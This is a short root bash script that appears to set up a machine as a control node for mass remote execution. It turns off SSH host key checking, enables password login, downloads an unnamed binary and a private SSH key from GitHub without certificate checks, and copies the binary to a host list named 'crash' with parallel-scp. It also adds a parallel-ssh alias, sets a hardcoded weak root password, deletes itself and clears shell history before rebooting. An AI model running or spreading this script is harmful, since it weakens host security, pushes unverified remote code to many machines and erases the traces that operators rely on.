#!/bin/bash
apt update 
apt install ssh -y
apt install pssh -y
echo 'StrictHostKeyChecking no' >> /etc/ssh/ssh_config
sed -i -e 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
wget https://github.com/Little-L000/Net-Stuff/raw/master/test --no-check-certificate -P /root
chmod +x test
wget -q https://raw.githubusercontent.com/Little-L000/Net-Stuff/master/id_ecdsa --no-check-certificat -P /root/.ssh
chown 400 /root/.ssh/id_ecdsa
parallel-scp -h "crash" -x "-i /root/.ssh/id_ecdsa" test /root/
echo "alias r6='parallel-ssh -i -t 250 -h AAAcrashAAA -x AAA-i /root/.ssh/id_ecdsaAAA'" >> ~/.bashrc
sed -i -e 's/AAA/"/g' ~/.bashrc
rm -rf test
rm -rf conf.sh
echo "root:test123test" | chpasswd
cat /dev/null > ~/.bash_history && history -c && reboot

